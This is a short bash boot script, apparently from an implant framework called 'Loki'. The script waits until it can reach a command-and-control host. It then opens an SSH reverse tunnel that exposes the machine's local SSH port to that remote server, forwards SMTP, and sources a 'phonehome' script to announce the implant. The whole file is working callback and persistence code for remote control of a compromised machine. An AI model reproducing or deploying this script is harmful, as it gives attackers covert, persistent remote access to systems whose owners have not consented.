#!/bin/bash 
###############################################################################
# onboot.sh - This is the parent script for all of the other loki scripts.
#
# Requirements
#
# Mod History:
# 9 Oct 2019 - nju - Now this only sets up the tunnels
# 8 Oct 2019 - nju - Cleaning up.
# 21 May 2019 - nju - created file from Loki framework
############################################################################### 

CONFIG

# Check for Networking
# Verify Network Connectivity and wait until we get it.  We can't do anything until
# we have network connectivity.
until curl -Isf $C2PROTO$C2
  do
    $LOG "[EINAR] Waiting for Network"
    sleep .25
  done

$LOG "Network Up"

# Bring up tunnel for email
sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -R $PROXYPORT:localhost:22 -C -i /home/$C2USER/.ssh/id_ecdsa -N -n
if [ $? -eq 0 ]; then
  $ECHO "[EINAR] SMTP Tunnel Up"
else
  $LOG "[EINAR} Failed to establish SMTP Tunnel"
  $ECHO "[EINAR] Failed to establish SMTP Tunnel"      
fi

# Let everyone know we're here
source $LOKIHOME/$MYNAME-phonehome.sh